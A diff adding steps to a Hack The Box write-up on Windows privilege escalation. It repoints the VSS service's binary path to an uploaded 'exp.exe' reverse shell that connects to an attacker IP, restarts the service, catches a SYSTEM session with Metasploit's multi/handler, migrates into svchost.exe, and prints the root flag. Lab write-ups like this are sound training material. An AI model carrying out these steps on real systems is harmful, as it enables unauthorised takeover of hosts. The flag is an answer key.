@@ -205,9 +205,88 @@ sc.exe config VSS binPath="C:\Users\svc-printer\Downloads\exp.exe -e cmd.exe 10.
 ```
 
 
+20. Great! Set a listener at port 1337, then to trigger it we need to stop the VSS service then start it again.
+
+> HOW TO
+
+```
+To stop:
+sc.exe stop vss
+
+To start:
+sc.exe start vss
+```
+
+> RESULT
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/e932828f-c9f5-4531-a17a-998cbffbe10a)
 
 
+21. But somehow we failed to get the shell, I assume our shell is not stable.
+22. Hence, I tried to use metasploit's meterpreter, we can use **exploit/multi/handler** module.
 
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/2696b2a5-0b13-46f9-b7d3-c9bcdbb9f042)
+
+
+23. We need to set 3 things here:
+
+```
+[+] The payload we want to send.
+[+] The localhost ip.
+[+] The localport.
+```
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/595c0ce7-fd13-4911-8f25-84d42977c05b)
+
+
+24. Then run the module.
+25. Great! Now we need to modify the binary path again to this:
+
+```
+sc.exe config VSS binPath="C:\Users\svc-printer\Downloads\exp.exe"
+```
+
+26. Now trigger it again by stop and start the VSS service.
+
+> WE GAINED ROOT
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/56229ca2-e224-45bb-a7c4-ed0ef229a8df)
+
+
+27. But again this is still not stable enough!
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/6f041abf-0f49-48ed-acc8-22df21238c79)
+
+
+28. We need to migrate, to check which PID to migrate, simply run PS at the meterpreter terminal.
+
+> Running PS
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/ff957322-9296-4cb1-8255-ddcb5ece9f44)
+
+
+29. As you can see there are many processes which running as **NT AUTHORITY\SYSTEM**, we just need to migrate to one of them (the appropriate one).
+30. For example, I tried to migrate to common process --> **svchost.exe**.
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/2f897418-ae43-4c80-a83d-0420d69b14be)
+
+
+> RESULT
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/f4d4ee29-7c29-43ac-b7c9-d0d6e7102aa6)
+
+31. We gained a stable shell for root now!
+
+> GETTING THE ROOT FLAG
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/dbf02e97-dd4f-4eac-aaf9-17704d631e27)
+
+
+## ROOT FLAG
+
+```
+13d8bcff5bea9d89a44da9aacb41b4a4
+```
 
 ## IMPORTANT LINKS
 
